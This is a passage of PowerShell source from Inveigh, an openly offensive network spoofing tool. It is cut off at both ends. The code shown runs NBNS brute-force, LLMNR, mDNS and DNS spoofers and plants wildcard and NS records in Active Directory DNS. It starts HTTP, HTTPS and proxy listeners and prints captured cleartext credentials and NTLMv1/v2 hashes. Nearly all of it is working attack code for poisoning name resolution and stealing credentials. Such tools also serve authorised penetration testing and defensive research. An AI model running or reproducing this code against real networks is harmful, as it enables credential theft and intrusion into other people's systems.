{\n\n        :NBNS_spoofer_loop while (!$inveigh.hostname_spoof -and $inveigh.running)\n        {\n\n            if($NBNS_paused)\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer\") > $null\n                $NBNS_paused = $false\n            }\n\n            for ($i = 0; $i -lt 255; $i++)\n            {\n\n                for ($j = 0; $j -lt 255; $j++)\n                {\n                    $NBNS_response_packet[0] = $i\n                    $NBNS_response_packet[1] = $j                 \n                    $NBNS_bruteforce_UDP_client.send($NBNS_response_packet,$NBNS_response_packet.Length)\n\n                    if($inveigh.hostname_spoof -and $NBNSBruteForcePause)\n                    {\n                        $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer\") > $null\n                        $NBNS_paused = $true\n                        break NBNS_spoofer_loop\n                    }\n                \n                }\n            \n            }\n        \n        }\n\n        Start-Sleep -m 5\n    }\n\n    $NBNS_bruteforce_UDP_client.Close()\n}\n\n# Control Loop ScriptBlock\n$control_scriptblock =\n{\n    param ($ADIDNSACE,$ADIDNSCleanup,[System.Management.Automation.PSCredential]$ADIDNSCredential,$ADIDNSDomain,\n        $ADIDNSDomainController,$ADIDNSForest,$ADIDNSHostsIgnore,$ADIDNSNS,$ADIDNSNSTarget,$ADIDNSPartition,\n        $ADIDNSThreshold,$ADIDNSTTL,$ADIDNSZone,$ConsoleQueueLimit,$elevated_privilege,$NBNSBruteForcePause,\n        $RunCount,$RunTime,$SpooferIP)\n\n    function Invoke-OutputQueueLoop\n    {\n\n        while($inveigh.output_queue.Count -gt 0)\n        {\n            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null\n\n            if($inveigh.file_output)\n            {\n                \n                if ($inveigh.output_queue[0].StartsWith(\"[+] \") -or $inveigh.output_queue[0].StartsWith(\"[*] \") -or $inveigh.output_queue[0].StartsWith(\"[!] \") -or $inveigh.output_queue[0].StartsWith(\"[-] \"))\n                {\n                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null\n                }\n                else\n                {\n                    $inveigh.log_file_queue.Add(\"[redacted]\") > $null    \n                }\n\n            }\n\n            if($inveigh.log_output)\n            {\n                $inveigh.log.Add($inveigh.output_queue[0]) > $null\n            }\n\n            $inveigh.output_queue.RemoveAt(0)\n        }\n\n    }\n\n    function Stop-InveighRunspace\n    {\n        param ([String]$Message)\n        \n        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))\n        {\n\n            try\n            {\n                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store(\"My\",\"LocalMachine\")\n                $certificate_store.Open('ReadWrite')\n                $certificates = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -Like \"CN=\" + $inveigh.certificate_issuer})\n\n                foreach($certificate in $certificates)\n                {\n                    $certificate_store.Remove($certificate)\n                }\n\n                $certificate_store.Close()\n            }\n            catch\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]\") > $null\n            }\n\n        }\n\n        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS_table.Count -gt 0)\n        {\n            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n            {\n                \n                if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)\n                {\n\n                    try\n                    {\n                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone\n                        $inveigh.ADIDNS_table.$ADIDNS_host = $null\n                    }\n                    catch\n                    {\n                        $error_message = $_.Exception.Message\n                        $error_message = $error_message -replace \"`n\",\"\"\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed\") > $null\n                    }\n\n                }\n\n            }\n\n        }\n        \n        if($inveigh.relay_running)\n        {\n            Start-Sleep -m 100\n\n            if($Message)\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $Message\") > $null\n            }\n            else\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh Relay is exiting\") > $null  \n            }\n\n            if(!$inveigh.running)\n            {\n                Invoke-OutputQueueLoop\n                Start-Sleep -m 100\n            }\n\n            $inveigh.relay_running = $false\n        }\n\n        if($inveigh.running)\n        {\n\n            if($Message)\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh is exiting due to $Message\") > $null\n            }\n            else\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh is exiting\") > $null  \n            }\n\n            Invoke-OutputQueueLoop\n\n            if(!$elevated_privilege)\n            {\n                Start-Sleep -s 3\n            }\n\n            $inveigh.running = $false\n        }\n\n        $inveigh.ADIDNS = $null\n        $inveigh.HTTPS = $false\n    }\n\n    if($inveigh.ADIDNS -contains 'Wildcard')\n    {\n        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node '*' -Partition $ADIDNSPartition -Type 'A'-TTL $ADIDNSTTL -Zone $ADIDNSZone\n    }\n\n    if($inveigh.ADIDNS -contains 'NS')\n    {\n\n        if($ADIDNSNSTarget.EndsWith($ADIDNSZone))\n        {\n            $NS_data = $ADIDNSNSTarget\n            $ADIDNSNSTarget = $ADIDNSNSTarget -replace \".$ADIDNSZone\",''\n        }\n        else\n        {\n            $NS_data = $ADIDNSNSTarget + \".\" + $ADIDNSZone\n        }\n\n        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNSTarget -Partition $ADIDNSPartition -Type 'A' -TTL $ADIDNSTTL -Zone $ADIDNSZone\n        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $NS_data -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNS -Partition $ADIDNSPartition -Type 'NS' -TTL $ADIDNSTTL -Zone $ADIDNSZone\n    }\n\n    if($NBNSBruteForcePause)\n    {   \n        $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause\n    }\n\n    $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count\n    $run_count_NTLMv2 = $RunCount + $inveigh.NTLMv2_list.Count\n    $run_count_cleartext = $RunCount + $inveigh.cleartext_list.Count\n\n    if($RunTime)\n    {    \n        $control_timeout = New-TimeSpan -Minutes $RunTime\n        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n    }\n\n    while($inveigh.running)\n    {\n\n        if($NBNSBruteForcePause -and $inveigh.hostname_spoof)\n        {\n         \n            if($inveigh.NBNS_stopwatch.Elapsed -ge $NBNS_pause)\n            {\n                $inveigh.hostname_spoof = $false\n            }\n        \n        }\n\n        if($RunCount)\n        {\n            \n            if($inveigh.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $inveigh.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $inveigh.cleartext_list.Count -ge $run_count_cleartext)\n            {\n                Stop-InveighRunspace \"reaching run count\"           \n            }\n\n        }\n\n        if($RunTime)\n        {\n\n            if($control_stopwatch.Elapsed -ge $control_timeout)\n            {\n                Stop-InveighRunspace \"reaching run time\"\n            }\n\n        }\n\n        if($inveigh.ADIDNS -contains 'Combo' -and $inveigh.request_table_updated)\n        {\n            \n            try\n            {\n                Invoke-ADIDNSCheck -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Ignore $ADIDNSHostsIgnore -Partition $ADIDNSPartition -RequestTable $inveigh.request_table -Threshold $ADIDNSThreshold -TTL $ADIDNSTTL -Zone $ADIDNSZone\n            }\n            catch\n            {\n                $error_message = $_.Exception.Message\n                $error_message = $error_message -replace \"`n\",\"\"\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n            }\n\n            $inveigh.request_table_updated = $false\n        }\n\n        if($inveigh.ADIDNS -and $inveigh.ADIDNS_table.Count -gt 0)\n        {\n            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n            {\n                \n                if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)\n                {\n\n                    try\n                    {\n                        Grant-ADIDNSPermission -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Principal 'Authenticated Users'-Zone $ADIDNSZone\n                        $inveigh.ADIDNS_table.$ADIDNS_host = 2\n                    }\n                    catch\n                    {\n                        $error_message = $_.Exception.Message\n                        $error_message = $error_message -replace \"`n\",\"\"\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $ADIDNS_host failed\") > $null\n                    }\n\n                }\n\n            }\n\n        }\n\n        if($inveigh.file_output)\n        {\n\n            while($inveigh.log_file_queue.Count -gt 0)\n            {\n                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append\n                $inveigh.log_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.NTLMv1_file_queue.Count -gt 0)\n            {\n                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append\n                $inveigh.NTLMv1_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.NTLMv2_file_queue.Count -gt 0)\n            {\n                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append\n                $inveigh.NTLMv2_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.cleartext_file_queue.Count -gt 0)\n            {\n                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append\n                $inveigh.cleartext_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.POST_request_file_queue.Count -gt 0)\n            {\n                $inveigh.POST_request_file_queue[0]|Out-File $inveigh.POST_request_out_file -Append\n                $inveigh.POST_request_file_queue.RemoveAt(0)\n            }\n\n        }\n\n        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)\n        {\n\n            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)\n            {\n                $inveigh.console_queue.RemoveAt(0)\n            }\n\n        }\n\n        if(!$inveigh.status_output)\n        {\n            Invoke-OutputQueueLoop\n        }\n\n        Start-Sleep -m 5\n        \n        if($inveigh.stop)\n        {\n            $inveigh.console_queue.Clear()\n            Stop-InveighRunspace\n        }\n\n    }\n\n}\n\n#endregion\n#region begin startup functions\n\n# HTTP Listener Startup Function \nfunction HTTPListener\n{\n    $proxy_listener = $false\n    $HTTPS_listener = $false\n    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()\n    $HTTP_runspace.Open()\n    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $HTTP_powershell = [PowerShell]::Create()\n    $HTTP_powershell.Runspace = $HTTP_runspace\n    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $HTTP_powershell.AddScript($NTLM_functions_scriptblock) > $null\n    $HTTP_powershell.AddScript($kerberos_functions_scriptblock) > $null\n    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(\n        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(\n        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(\n        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(\n        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(\n        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(\n        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(\n        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null\n    $HTTP_powershell.BeginInvoke() > $null\n}\n\nStart-Sleep -m 50\n\n# HTTPS Listener Startup Function \nfunction HTTPSListener\n{\n    $proxy_listener = $false\n    $HTTPS_listener = $true\n    $HTTPS_runspace = [RunspaceFactory]::CreateRunspace()\n    $HTTPS_runspace.Open()\n    $HTTPS_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $HTTPS_powershell = [PowerShell]::Create()\n    $HTTPS_powershell.Runspace = $HTTPS_runspace\n    $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $HTTPS_powershell.AddScript($NTLM_functions_scriptblock) > $null\n    $HTTPS_powershell.AddScript($kerberos_functions_scriptblock) > $null\n    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(\n        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(\n        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(\n        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(\n        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(\n        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(\n        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(\n        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null\n    $HTTPS_powershell.BeginInvoke() > $null\n}\n\nStart-Sleep -m 50\n\n# Proxy Listener Startup Function \nfunction ProxyListener\n{\n    $proxy_listener = $true\n    $HTTPS_listener = $false\n    $proxy_runspace = [RunspaceFactory]::CreateRunspace()\n    $proxy_runspace.Open()\n    $proxy_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $proxy_powershell = [PowerShell]::Create()\n    $proxy_powershell.Runspace = $proxy_runspace\n    $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $proxy_powershell.AddScript($NTLM_functions_scriptblock) > $null\n    $proxy_powershell.AddScript($kerberos_functions_scriptblock) > $null\n    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(\n        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(\n        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(\n        $HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(\n        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(\n        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(\n        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(\n        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null\n    $proxy_powershell.BeginInvoke() > $null\n}\n\n# Sniffer/Spoofer Startup Function\nfunction SnifferSpoofer\n{\n    $sniffer_runspace = [RunspaceFactory]::CreateRunspace()\n    $sniffer_runspace.Open()\n    $sniffer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $sniffer_powershell = [PowerShell]::Create()\n    $sniffer_powershell.Runspace = $sniffer_runspace\n    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $sniffer_powershell.AddScript($NTLM_functions_scriptblock) > $null\n    $sniffer_powershell.AddScript($kerberos_functions_scriptblock) > $null\n    $sniffer_powershell.AddScript($SMB_functions_scriptblock) > $null\n    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($DNS).AddArgument($DNSTTL).AddArgument(\n        $EvadeRG).AddArgument($Inspect).AddArgument($IP).AddArgument($Kerberos).AddArgument($KerberosCount).AddArgument(\n        $KerberosCredential).AddArgument($KerberosHash).AddArgument($LLMNR).AddArgument(\n        $LLMNRTTL).AddArgument($mDNS).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(\n        $NBNSTTL).AddArgument($NBNSTypes).AddArgument($output_directory).AddArgument($Pcap).AddArgument(\n        $PcapTCP).AddArgument($PcapUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(\n        $SpooferHostsReply).AddArgument($SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument(\n        $SpooferIPsReply).AddArgument($SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument(\n        $SpooferLearningInterval).AddArgument($SpooferNonprintable).AddArgument(\n        $SpooferThresholdHost).AddArgument($SpooferThresholdNetwork) > $null\n    $sniffer_powershell.BeginInvoke() > $null\n}\n\n# Unprivileged DNS Spoofer Startup Function\nfunction DNSSpoofer\n{\n    $DNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()\n    $DNS_spoofer_runspace.Open()\n    $DNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $DNS_spoofer_powershell = [PowerShell]::Create()\n    $DNS_spoofer_powershell.Runspace = $DNS_spoofer_runspace\n    $DNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $DNS_spoofer_powershell.AddScript($DNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(\n        $DNSTTL).AddArgument($SpooferIP) > $null\n    $DNS_spoofer_powershell.BeginInvoke() > $null\n}\n\n# Unprivileged LLMNR Spoofer Startup Function\nfunction LLMNRSpoofer\n{\n    $LLMNR_spoofer_runspace = [RunspaceFactory]::CreateRunspace()\n    $LLMNR_spoofer_runspace.Open()\n    $LLMNR_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $LLMNR_spoofer_powershell = [PowerShell]::Create()\n    $LLMNR_spoofer_powershell.Runspace = $LLMNR_spoofer_runspace\n    $LLMNR_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $LLMNR_spoofer_powershell.AddScript($LLMNR_spoofer_scriptblock).AddArgument($Inspect).AddArgument(\n        $LLMNRTTL).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(\n        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(\n        $SpooferIPsIgnore).AddArgument($SpooferNonprintable) > $null\n    $LLMNR_spoofer_powershell.BeginInvoke() > $null\n}\n\n# Unprivileged mDNS Spoofer Startup Function\nfunction mDNSSpoofer\n{\n    $mDNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()\n    $mDNS_spoofer_runspace.Open()\n    $mDNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $mDNS_spoofer_powershell = [PowerShell]::Create()\n    $mDNS_spoofer_powershell.Runspace = $mDNS_spoofer_runspace\n    $mDNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $mDNS_spoofer_powershell.AddScript($mDNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(\n        $mDNSTTL).AddArgument($mDNSTypes).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(\n        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore) > $null\n    $mDNS_spoofer_powershell.BeginInvoke() > $null\n}\n\n# Unprivileged NBNS Spoofer Startup Function\nfunction NBNSSpoofer\n{\n    $NBNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()\n    $NBNS_spoofer_runspace.Open()\n    $NBNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $NBNS_spoofer_powershell = [PowerShell]::Create()\n    $NBNS_spoofer_powershell.Runspace = $NBNS_spoofer_runspace\n    $NBNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $NBNS_spoofer_powershell.AddScript($NBNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(\n        $IP).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument($SpooferIP).AddArgument(\n        $SpooferHostsIgnore).AddArgument($SpooferHostsReply).AddArgument($SpooferIPsIgnore).AddArgument(\n        $SpooferIPsReply).AddArgument($SpooferNonprintable) > $null\n    $NBNS_spoofer_powershell.BeginInvoke() > $null\n}\n\n# NBNS Brute Force Spoofer Startup Function\nfunction NBNSBruteForceSpoofer\n{\n    $NBNS_bruteforce_spoofer_runspace = [RunspaceFactory]::CreateRunspace()\n    $NBNS_bruteforce_spoofer_runspace.Open()\n    $NBNS_bruteforce_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $NBNS_bruteforce_spoofer_powershell = [PowerShell]::Create()\n    $NBNS_bruteforce_spoofer_powershell.Runspace = $NBNS_bruteforce_spoofer_runspace\n    $NBNS_bruteforce_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $NBNS_bruteforce_spoofer_powershell.AddScript($NBNS_bruteforce_spoofer_scriptblock).AddArgument(\n    $NBNSBruteForceHost).AddArgument($NBNSBruteForcePause).AddArgument($NBNSBruteForceTarget).AddArgument(\n    $NBNSTTL).AddArgument($SpooferIP) > $null\n    $NBNS_bruteforce_spoofer_powershell.BeginInvoke() > $null\n}\n\n# Control Loop Startup Function\nfunction ControlLoop\n{\n    $control_runspace = [RunspaceFactory]::CreateRunspace()\n    $control_runspace.Open()\n    $control_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $control_powershell = [PowerShell]::Create()\n    $control_powershell.Runspace = $control_runspace\n    $control_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $control_powershell.AddScript($ADIDNS_functions_scriptblock) > $null\n    $control_powershell.AddScript($control_scriptblock).AddArgument($ADIDNSACE).AddArgument(\n        $ADIDNSCleanup).AddArgument($ADIDNSCredential).AddArgument($ADIDNSDomain).AddArgument(\n        $ADIDNSDomainController).AddArgument($ADIDNSForest).AddArgument($ADIDNSHostsIgnore).AddArgument(\n        $ADIDNSNS).AddArgument($ADIDNSNSTarget).AddArgument($ADIDNSPartition).AddArgument(\n        $ADIDNSThreshold).AddArgument($ADIDNSTTL).AddArgument($ADIDNSZone).AddArgument(\n        $ConsoleQueueLimit).AddArgument($elevated_privilege).AddArgument($NBNSBruteForcePause).AddArgument(\n        $RunCount).AddArgument($RunTime).AddArgument($SpooferIP) > $null\n    $control_powershell.BeginInvoke() > $null\n}\n\n#endregion\n#region begin startup enabled services\n\n# HTTP Server Start\nif($HTTP -eq 'Y')\n{\n    HTTPListener\n}\n\n# HTTPS Server Start\nif($HTTPS -eq 'Y')\n{\n    HTTPSListener\n}\n\n# Proxy Server Start\nif($Proxy -eq 'Y')\n{\n    ProxyListener\n}\n\n# Sniffer/Spoofer Start\nif(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and $elevated_privilege)\n{ \n    SnifferSpoofer\n}\nelseif(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$elevated_privilege)\n{\n\n    if($DNS -eq 'Y')\n    {\n        DNSSpoofer\n    }\n\n    if($LLMNR -eq 'Y')\n    {\n        LLMNRSpoofer\n    }\n\n    if($mDNS -eq 'Y')\n    {\n        mDNSSpoofer\n    }\n\n    if($NBNS -eq 'Y')\n    {\n        NBNSSpoofer\n    }\n\n    if($NBNSBruteForce -eq 'Y')\n    {\n        NBNSBruteForceSpoofer\n    }\n\n}\n\n# NBNSBruteForce Spoofer Start\nif($NBNSBruteForce -eq 'Y')\n{\n    NBNSBruteForceSpoofer\n}\n\n# Control Loop Start\nControlLoop\n\n# Console Output Loop\ntry\n{\n\n    if($ConsoleOutput -ne 'N')\n    {\n\n        if($ConsoleStatus)\n        {    \n            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus\n            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n        }\n\n        :console_loop while(($inveigh.running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))\n        {\n    \n            while($inveigh.console_queue.Count -gt 0)\n            {\n\n                switch -wildcard ($inveigh.console_queue[0])\n                {\n\n                    {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n                    {\n\n                        if($inveigh.output_stream_only)\n                        {\n                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                        }\n                        else\n                        {\n                            Write-Warning($inveigh.console_queue[0])\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                    {$_ -like \"* spoofer disabled\" -or $_ -like \"* local request\" -or $_ -like \"* host header *\" -or $_ -like \"* user agent received *\"}\n                    {\n\n                        if($ConsoleOutput -eq 'Y')\n                        {\n\n                            if($inveigh.output_stream_only)\n                            {\n                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                            }\n                            else\n                            {\n                                Write-Output($inveigh.console_queue[0])\n                            }\n\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    } \n\n                    {$_ -like \"*response sent]\" -or $_ -like \"*ignoring*\" -or $_ -like \"* HTTP*request for *\" -or $_ -like \"* Proxy*request for *\" -or $_ -like \"*SYN packet*\"}\n                    {\n                    \n                        if($ConsoleOutput -ne \"Low\")\n                        {\n\n                            if($inveigh.output_stream_only)\n                            {\n                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                            }\n                            else\n                            {\n                                Write-Output($inveigh.console_queue[0])\n                            }\n\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    } \n\n                    default\n                    {\n\n                        if($inveigh.output_stream_only)\n                        {\n                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                        }\n                        else\n                        {\n                            Write-Output($inveigh.console_queue[0])\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                }\n\n            }\n\n            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)\n            {\n            \n                if($inveigh.cleartext_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique cleartext captures:\" + $inveigh.newline)\n                    $inveigh.cleartext_list.Sort()\n                    $cleartext_list_temp = $inveigh.cleartext_list\n\n                    foreach($unique_cleartext in $cleartext_list_temp)\n                    {\n\n                        if($unique_cleartext -ne $unique_cleartext_last)\n                        {\n                            Write-Output($unique_cleartext + $inveigh.newline)\n                        }\n\n                        $unique_cleartext_last = $unique_cleartext\n                    }\n\n                    Start-Sleep -m 5\n                }\n                else\n                {\n                    Write-Output(\"[+] [$(Get-Date -format s)] No cleartext credentials have been captured\" + $inveigh.newline)\n                }\n\n                if($inveigh.POST_request_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique POST request captures:\" + $inveigh.newline)\n                    $inveigh.POST_request_list.Sort()\n                    $POST_request_list_temp = $inveigh.POST_request_list\n\n                    foreach($unique_POST_request in $POST_request_list_temp)\n                    {\n\n                        if($unique_POST_request -ne $unique_POST_request_last)\n                        {\n                            Write-Output($unique_POST_request + $inveigh.newline)\n                        }\n\n                        $unique_POST_request_last = $unique_POST_request\n                    }\n\n                    Start-Sleep -m 5\n                }\n            \n                if($inveigh.NTLMv1_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:\" + $inveigh.newline)\n                    $inveigh.NTLMv1_list.Sort()\n                    $NTLMv1_list_temp = $inveigh.NTLMv1_list\n\n                    foreach($unique_NTLMv1 in $NTLMv1_list_temp)\n                    {\n                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(\":\",($unique_NTLMv1.IndexOf(\":\") + 2)))\n\n                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)\n                        {\n                            Write-Output($unique_NTLMv1 + $inveigh.newline)\n                        }\n\n                        $unique_NTLMv1_account_last = $unique_NTLMv1_account\n                    }\n\n                    $unique_NTLMv1_account_last = ''\n                    Start-Sleep -m 5\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:\" + $inveigh.newline)\n                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list\n\n                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)\n                    {\n                        Write-Output($NTLMv1_username + $inveigh.newline)\n                    }\n\n                    Start-Sleep -m 5\n                }\n                else\n                {\n                    Write-Output(\"[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured\" + $inveigh.newline)\n                }\n\n                if($inveigh.NTLMv2_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:\" + $inveigh.newline)\n                    $inveigh.NTLMv2_list.Sort()\n                    $NTLMv2_list_temp = $inveigh.NTLMv2_list\n\n                    foreach($unique_NTLMv2 in $NTLMv2_list_temp)\n                    {\n                        $unique_NTLMv2_account = 